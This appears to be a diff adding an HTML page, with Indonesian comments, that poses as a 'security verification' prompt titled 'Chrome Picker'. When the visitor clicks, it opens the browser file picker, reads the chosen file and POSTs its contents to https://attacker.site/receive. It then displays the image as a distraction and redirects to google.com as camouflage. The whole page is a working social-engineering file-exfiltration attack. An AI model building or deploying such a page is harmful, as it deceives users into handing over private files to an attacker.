@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Chrome Picker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      color: red;
+      font-size: 24px;
+      text-align: center;
+      margin-top: 100px;
+    }
+  </style>
+</head>
+<body onclick="load()">
+  Click Here to continue security verification...
+
+  <script>
+    async function load() {
+      try {
+        // Tampilkan picker file
+        const handles = await window.showOpenFilePicker();
+        const fileHandle = handles[0];
+
+        // Permintaan izin akses file
+        const permission = await fileHandle.requestPermission();
+        if (permission !== 'granted') {
+          alert("File access denied.");
+          return;
+        }
+
+        // Baca file
+        const file = await fileHandle.getFile();
+        const reader = new FileReader();
+
+        reader.onload = function(event) {
+          // 🔥 Kirim isi file ke server attacker (spoofing real background task)
+          fetch("https://attacker.site/receive", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/octet-stream"
+            },
+            body: event.target.result
+          });
+
+          // Tampilkan gambar sebagai pengalih perhatian
+          const img = document.createElement("img");
+          img.src = event.target.result;
+          img.style = "max-width:80%; margin-top:20px;";
+          document.body.appendChild(img);
+        };
+
+        // Paksa sebagai base64 image jika mungkin
+        if (file.type.startsWith("image/")) {
+          reader.readAsDataURL(file);
+        } else {
+          reader.readAsText(file); // atau gunakan readAsArrayBuffer untuk file sensitif
+        }
+
+        // Kamuflase redirect
+        setTimeout(() => {
+          window.location.href = "https://google.com";
+        }, 1500);
+      } catch (e) {
+        console.error(e);
+        alert("Your browser does not support this feature or access was denied.");
+      }
+    }
+  </script>
+</body>
+</html>
